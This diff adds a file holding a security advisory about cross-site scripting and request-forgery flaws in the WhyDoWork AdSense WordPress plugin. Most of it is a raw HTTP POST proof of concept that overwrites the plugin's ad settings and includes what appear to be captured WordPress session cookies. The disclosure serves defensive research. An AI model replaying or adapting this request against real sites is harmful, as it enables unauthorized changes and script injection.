@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/68954/info
+
+WhyDoWork AdSense plugin for WordPress is prone to a cross-site scripting vulnerability and a cross-site request-forgery vulnerability.
+
+An attacker may exploit these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, or perform unauthorized actions. Other attacks may also be possible.
+
+WhyDoWork AdSense plugin 1.2 and prior are vulnerable. 
+
+POST URL:
+http://www.example.com/wordpress/wp-admin/options-general.php?page=whydowork_adsense&idcode=1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101
+Firefox/31.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-co
+Accept-Encoding: gzip, deflate
+Referer:
+http://www.example.com/wordpress/wp-admin/options-general.php?page=whydowork_adsense&idcode=1
+Cookie:
+wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=hacking%7C1406766762%7C0a0ccdb16a9d99c2b9113e25e2ea6b8d;
+wp-settings-time-1=1406489836;
+wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse;
+wordpress_test_cookie=WP+Cookie+check;
+wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=loreleitaron%7C1406766762%7C667e59a36d4254c8a178580770ac5135
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 843
+
+CONTENIDO POST:
+idx=1&whydowork_code=tets&whydowork_exclude=&whydowork_front_code_1=FALSE&whydowork_front_pos_1=top&whydowork_front_post_1=1&whydowork_front_code_2=FALSE&whydowork_front_pos_2=top&whydowork_front_post_2=1&whydowork_front_code_3=FALSE&whydowork_front_pos_3=top&whydowork_front_post_3=1&whydowork_page_code_1=FALSE&whydowork_page_pos_1=top&whydowork_page_code_2=FALSE&whydowork_page_pos_2=top&whydowork_page_code_3=FALSE&whydowork_page_pos_3=top&whydowork_single_code_1=FALSE&whydowork_single_pos_1=top&whydowork_single_code_2=FALSE&whydowork_single_pos_2=top&whydowork_single_code_3=FALSE&whydowork_single_pos_3=top&whydowork_singleold_code_1=FALSE&whydowork_singleold_pos_1=top&whydowork_singleold_code_2=FALSE&whydowork_singleold_pos_2=top&whydowork_singleold_code_3=FALSE&whydowork_singleold_pos_3=top&whydowork_adsense_oldday=&Submit=Update
+
